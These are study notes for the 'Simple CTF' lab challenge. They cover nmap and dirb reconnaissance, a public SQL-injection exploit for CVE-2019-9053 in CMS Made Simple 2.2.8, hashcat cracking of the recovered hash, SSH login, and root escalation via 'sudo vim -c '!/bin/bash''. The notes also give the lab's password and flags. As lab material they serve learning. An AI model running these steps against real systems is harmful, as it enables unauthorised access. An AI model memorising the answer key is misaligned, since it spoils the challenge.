# Simple CTF

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

### How many services are running under port 1000?

```bash
nmap -A -sV -p 1-1000 10.10.61.168 > nmap.txt
```

- **Answer:** 2

### What is running on the higher port?

```bash
nmap -A -sV 10.10.61.168 >> nmap.txt
```

- resulted in the identification of SSH on port 2222

- **Answer:** SSH

### What's the CVE you're using against the application?

- open the IP in a browser and made a bunch of observations

- "Apache 2" server

- index file is located at "/var/www/html/html/index.html"

- configuration documentation is at: "/usr/share/doc/apache2/README.Debian.gz"

- lots of directories

- command: dirb http://10.10.61.168 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o dirb.txt -S; "o" is the output file; "S" prevents dirb from printing every word tested, only showing successful directories

- identified "/simple/" subdirectory which has a bunch of own subdirectories

- point browser to the "simple" and reveals a webpage

- the webpage is powered by "CMS Made Simple version 2.2.8"

- search exploit-db and found: https://www.exploit-db.com/exploits/46635

- **Answer:** CVE-2019-9053

### To what kind of vulnerability is the application vulnerable?

- SQLi

### What's the password?

- downloaded the exploit and opened the file to identify any usage instructions and found required and optional flags

- couldn't get the exploit to run and looked at the python. Lots of missing parenthesis but still would not run under python2

- different version of the exploit at: https://github.com/e-renna/CVE-2019-9053/blob/master/exploit.py

- Command: python exploit.py -u <target IP> --crack -w <path to rockyou.txt>

- The script never runs all the way through

- -reveals the salt: 1dac0d92e9fa6bb2

- -reveals the username: mithc

- -reveals an email: admin@admin.com

- -reveals a hash: 0c01f4468bd75d7a84c7eb73846e8d96$

- put the hash:salt in a file: cipher.txt

- Command: hashcat -m 20 -a 0 cipher.txt /usr/share/wordlists/rockyou.txt

- password: secret

### Where can you login with the details obtained?

- command: ssh -p 2222 mitch@10.10.61.168

- password is secret

### What's the user flag?

- command: cat user.txt

- **Answer:** G00d j0b, keep up!

### Is there any other user in the home directory? What's its name?

- **Answer:** sunbath

### What can you leverage to spawn a privileged shell?

- command: "sudo -l"

- indicates mitch can run VIM with sudo, without a password

- **Answer:** VIM

### What's the root flag?

- command: sudo vim -c '!/bin/bash'

- starts a root shell

- **Answer:** W3ll d0n3. You made it!
